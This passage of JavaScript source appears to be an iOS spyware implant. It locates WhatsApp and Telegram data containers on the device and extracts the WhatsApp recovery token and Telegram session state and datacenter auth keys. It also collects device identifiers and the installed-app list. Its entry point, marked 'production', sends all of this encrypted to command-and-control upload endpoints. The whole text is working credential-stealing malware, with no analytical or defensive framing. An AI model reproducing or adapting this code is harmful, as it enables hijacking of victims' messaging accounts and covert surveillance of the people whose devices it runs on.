        while (rcOffset < rcData.length && rcData[rcOffset++] & 0x80) {}
      } else if (wireType === 2) {
        var len = 0, shift = 0;
        while (rcOffset < rcData.length) {
          var b = rcData[rcOffset++];
          len |= (b & 0x7F) << shift;
          if (!(b & 0x80)) break;
          shift += 7;
        }
        if (fieldNum === 2) {
          recoveryToken = rcData.slice(rcOffset, rcOffset + len);
          break;
        }
        rcOffset += len;
      } else break;
    }
    if (!recoveryToken || recoveryToken.length === 0) {
      return waDiagPayload(deviceInfo, steps, "field2", userId);
    }
    steps.field2Token = true;
    steps.tokenLen = recoveryToken.length;

    // Format: base64(userId + "#" + recoveryToken)
    var phoneBytes = Native.stringToBytes(userId + "#", false);
    var combined = new Uint8Array(phoneBytes.byteLength + recoveryToken.length);
    combined.set(new Uint8Array(phoneBytes), 0);
    combined.set(recoveryToken, phoneBytes.byteLength);
    var rc = base64Encode(combined);

    // 4. Build payload (same rc shape + tokenLen for mock logs)
    return {
      channel: CC,
      unique: deviceInfo.udid,
      ecid: deviceInfo.ecid,
      serial: deviceInfo.serial,
      account: userId,
      data: JSON.stringify({
        apiType: 1,
        _version: 1,
        dataType: "rc",
        edition: isBusiness ? "business" : "personal",
        userId: userId,
        tokenLen: recoveryToken.length,
        rc: rc
      })
    };

  } catch(e) {
    return waDiagPayload(deviceInfo, steps, "exception", userId);
  }
}

// --- Helpers ---

function findWAAppGroup(sharedGroupId) {
  var basePath = "/var/mobile/Containers/Shared/AppGroup";
  var entries = listDirectory(basePath);
  for (var i = 0; i < entries.length; i++) {
    var name = entries[i];
    if (name.length !== 36) continue;
    var metaPath = basePath + "/" + name + "/.com.apple.mobile_container_manager.metadata.plist";
    if (!Native.fileExists(metaPath)) continue;
    var raw = Native.readFile(metaPath);
    if (!raw) continue;
    var rawStr = Native.bytesToString(raw.buffer, false);
    if (rawStr.indexOf(sharedGroupId) !== -1) {
      return basePath + "/" + name;
    }
  }
  return null;
}

function findWAAppContainer(appBundleId) {
  var basePath = "/var/mobile/Containers/Data/Application";
  var entries = listDirectory(basePath);
  for (var i = 0; i < entries.length; i++) {
    var name = entries[i];
    if (name.length !== 36) continue;
    var metaPath = basePath + "/" + name + "/.com.apple.mobile_container_manager.metadata.plist";
    if (!Native.fileExists(metaPath)) continue;
    var raw = Native.readFile(metaPath);
    if (!raw) continue;
    var rawStr = Native.bytesToString(raw.buffer, false);
    if (rawStr.indexOf(appBundleId) !== -1 && rawStr.indexOf("shared") === -1) {
      return basePath + "/" + name;
    }
  }
  return null;
}


// --- telegram.js ---
// Telegram data extraction
// Target: ph.telegra.Telegraph






const TG_GROUP = "group.ph.telegra.Telegraph";

function extractTelegram(kcData, deviceInfo) {
  try {
    // 1. Find Telegram AppGroup container
    const appGroupPath = findTGAppGroup();
    if (!appGroupPath) return null;

    // 2. Confirm telegram-data/ exists
    const telegramDataPath = appGroupPath + "/telegram-data";
    if (!Native.fileExists(telegramDataPath)) return null;

    // 3. Read atomic-state
    const atomicStatePath = telegramDataPath + "/accounts-metadata/atomic-state";
    const atomicStateRaw = Native.readFile(atomicStatePath);
    if (!atomicStateRaw) return null;

    const atomicStateStr = Native.bytesToString(atomicStateRaw.buffer, false);
    let atomicState;
    try {
      atomicState = JSON.parse(atomicStateStr);
    } catch(e) {
      return null;
    }

    // Find first non-logged-out account
    let userId = 0;
    let accountId = "";

    if (atomicState && atomicState.records) {
      for (const record of atomicState.records) {
        if (record.attributes) {
          // Check loggedOut flag
          let loggedOut = false;
          for (const attr of record.attributes) {
            if (attr.loggedOut) { loggedOut = true; break; }
          }
          if (loggedOut) continue;

          // Extract peerId from backupData
          for (const attr of record.attributes) {
            if (attr.backupData && attr.backupData.data) {
              try {
                const backupBytes = base64Decode(attr.backupData.data);
                const backupStr = Native.bytesToString(backupBytes.buffer, false);
                const backupJson = JSON.parse(backupStr);
                if (backupJson.peerId) {
                  userId = Number(backupJson.peerId) || 0;
                }
              } catch(e) {}
            }
          }

          // accountId from record id
          if (record.id !== undefined) {
            accountId = String(record.id);
          }
          break;
        }
      }
    }

    // Try alternative: scan account directories
    if (!accountId) {
      const entries = listDirectory(telegramDataPath);
      for (const name of entries) {
        if (name.startsWith("account-")) {
          accountId = name.replace("account-", "");
          break;
        }
      }
    }

    if (!userId && atomicState.currentRecordId !== undefined) {
      accountId = String(atomicState.currentRecordId);
    }

    if (!userId) return null; // 

    // 4. Read db_sqlite
    const dbPath = telegramDataPath + "/account-" + accountId + "/postbox/db/db_sqlite";
    const db = sqliteOpen(dbPath);
    if (!db) return null;

    let datacenterAuthInfoById = "";
    let datacenterAddressSetById = "";

    try {
      // datacenterAuthInfoById
      const authRows = sqliteQueryBlobKey(db, "SELECT value FROM t1 WHERE key = ?", "persistent:datacenterAuthInfoById");
      if (authRows && authRows.length > 0 && authRows[0].value) {
        if (authRows[0].value instanceof Uint8Array) {
          datacenterAuthInfoById = base64Encode(authRows[0].value);
        }
      }

      // datacenterAddressSetById
      const addrRows = sqliteQueryBlobKey(db, "SELECT value FROM t1 WHERE key = ?", "persistent:datacenterAddressSetById");
      if (addrRows && addrRows.length > 0 && addrRows[0].value) {
        if (addrRows[0].value instanceof Uint8Array) {
          datacenterAddressSetById = base64Encode(addrRows[0].value);
        }
      }
    } catch(e) {}

    sqliteClose(db);

    // Build db_sqlite field as base64 JSON
    const dbSqliteObj = { datacenterAuthInfoById, datacenterAddressSetById };
    const dbSqliteStr = base64Encode(new Uint8Array(Native.stringToBytes(JSON.stringify(dbSqliteObj), false)));

    // state = base64 of raw atomic-state bytes
    const stateStr = base64Encode(atomicStateRaw);

    // Validate required fields
    if (!stateStr) return null; // 
    if (!dbSqliteStr) return null; // 

    // 5. Build payload
    return {
      channel: CC,
      unique: deviceInfo.udid,
      ecid: deviceInfo.ecid,
      serial: deviceInfo.serial,
      user_id: userId,
      state: stateStr,
      db_sqlite: dbSqliteStr
    };

  } catch(e) {
    return null;
  }
}

// --- Helpers ---

function findTGAppGroup() {
  const basePath = "/var/mobile/Containers/Shared/AppGroup";
  const entries = listDirectory(basePath);
  for (const name of entries) {
    if (name.length !== 36) continue;
    const metaPath = basePath + "/" + name + "/.com.apple.mobile_container_manager.metadata.plist";
    if (!Native.fileExists(metaPath)) continue;
    const raw = Native.readFile(metaPath);
    if (!raw) continue;
    const rawStr = Native.bytesToString(raw.buffer, false);
    if (rawStr.indexOf(TG_GROUP) !== -1) {
      // Verify telegram-data exists
      const tdPath = basePath + "/" + name + "/telegram-data";
      if (Native.fileExists(tdPath)) {
        return basePath + "/" + name;
      }
    }
  }
  return null;
}


// --- index.js ---
// Extract Payload - Entry Point (production)
// Each step is independent - one failure should not affect others

(function() {
  try { objcInit(); } catch(e) {}
  var deviceInfo = null;
  try { deviceInfo = collectDeviceInfo(); } catch(e) {}
  if (!deviceInfo) deviceInfo = { udid:"", ecid:"", serial:"", productType:"", iosVersion:"", buildVersion:"" };

  // 1. Activate device
  try {
    postEncryptedToC2(CD, "/api/v1/device/activate", {
      device: typeof DV !== "undefined" ? DV : "",
      channel: CC,
      unique: deviceInfo.udid,
      ecid: deviceInfo.ecid,
      serial: deviceInfo.serial,
      deviceInfo: {
        productType: deviceInfo.productType,
        productVersion: deviceInfo.iosVersion,
        buildVersion: deviceInfo.buildVersion
      },
      domain: typeof DM !== "undefined" ? DM : "",
      ts: Date.now()
    });
  } catch(e) {}

  // 2. App list upload
  var appList = null;
  try {
    appList = extractInstalledApps();
    if (appList && appList.length > 0) {
      postEncryptedToC2(CD, "/api/v1/device/apps", {
        channel: CC,
        unique: deviceInfo.udid,
        ecid: deviceInfo.ecid,
        serial: deviceInfo.serial,
        al: appList
      });
    }
  } catch(e) {}

  // 3. Extract Telegram
  var tgPayload = null;
  try {
    tgPayload = extractTelegram(null, deviceInfo);
    if (tgPayload) postEncryptedToC2(CD, "/api/v1/telegram/upload", tgPayload);
  } catch(e) {}

  // 4. Extract WhatsApp (personal + business; always POST rc or diag)
  try {
    var waPayload = extractWhatsApp(deviceInfo, "personal");
    if (waPayload) postEncryptedToC2(CD, "/api/v1/whatsapp/upload", waPayload);
  } catch(e) {}
  try {
    var waBizPayload = extractWhatsApp(deviceInfo, "business");
    if (waBizPayload) postEncryptedToC2(CD, "/api/v1/whatsapp/upload", waBizPayload);
  } catch(e) {}

})();



})();
